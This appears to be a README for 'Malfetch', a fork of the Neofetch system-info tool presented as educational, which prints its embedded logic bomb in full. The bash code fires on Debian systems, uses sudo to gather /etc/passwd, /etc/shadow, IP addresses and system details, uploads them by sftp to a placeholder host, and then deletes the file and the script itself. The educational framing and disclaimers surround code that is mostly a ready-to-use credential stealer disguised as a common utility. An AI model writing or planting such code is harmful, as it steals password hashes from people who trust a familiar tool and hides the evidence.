# Malfetch
Malfetch is a fork of Neofetch designed for educational purposes. This repository contains a logic bomb integrated into the original Neofetch functionality, allowing users to understand the implications of malicious code in a controlled environment.

# Warning
This repository is intended for educational purposes only. It is crucial to understand the ethical implications of using and distributing malicious code. Use this repository responsibly and only in environments where you have explicit permission to test and learn.

# Malicious Part
There is no default IP address or hostname, so the created system file won't go anywhere until you edit the code.
``` bash
logic() {
    [[ $distro ]] && return

    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        if [[ $ID == "debian" ]]; then
            distro="Debian ${VERSION_ID:-${VERSION}}"
            malicious  
        fi
    fi
}

malicious() {
    sudo bash -c 'cat /etc/passwd > /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   cat /etc/shadow >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "Local IP Address(es):" >> /tmp/xyz1048udk && \
                   hostname -I >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "Public IP Address:" >> /tmp/xyz1048udk && \
                   curl -s ifconfig.me >> /tmp/xyz1048udk && \
                   echo "" >> /tmp/xyz1048udk && \
                   echo "System Information:" >> /tmp/xyz1048udk && \
                   echo "Operating System:" >> /tmp/xyz1048udk && \
                   lsb_release -d >> /tmp/xyz1048udk && \
                   echo "Kernel Version:" >> /tmp/xyz1048udk && \
                   uname -r >> /tmp/xyz1048udk && \
                   echo "Disk Usage:" >> /tmp/xyz1048udk && \
                   df -h >> /tmp/xyz1048udk'

    sftp username@hostname <<EOF
put /tmp/xyz1048udk
bye
EOF

    sudo rm /tmp/xyz1048udk
    sudo rm -- "$0"  
}

malicious()
```

# Disclaimer
The authors of this repository are not responsible for any misuse of the code contained herein. By using this repository, you agree to take full responsibility for your actions and to use the code only in ethical and legal contexts.
